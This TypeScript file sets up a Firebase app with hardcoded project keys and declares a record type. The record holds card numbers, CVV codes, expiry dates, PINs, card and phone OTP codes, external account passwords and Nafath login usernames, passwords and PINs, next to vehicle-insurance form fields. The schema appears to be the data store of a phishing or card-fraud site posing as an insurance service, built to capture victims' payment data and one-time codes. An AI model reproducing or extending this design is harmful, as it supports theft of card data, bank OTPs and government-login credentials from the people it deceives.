import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyA1SM6u61pYP3Uivsnd9o2-xfnIdk3Ci2w",
  authDomain: "tannns-f866c.firebaseapp.com",
  databaseURL: "https://tannns-f866c-default-rtdb.firebaseio.com",
  projectId: "tannns-f866c",
  storageBucket: "tannns-f866c.firebasestorage.app",
  messagingSenderId: "551542084902",
  appId: "1:551542084902:web:16f3ee59d46ee5c3881de7",
  measurementId: "G-PVTG0CY9QF"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database, type NotificationDocument };

  
interface PaymentData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface NotificationDocument {
  id: string
  agreeToTerms?: boolean
  buyer_identity_number?: string
  card_number?: string
  country?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  formData?: FormData
  cardNumber?:string
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode: string
  phoneVerificationStatus: string
}
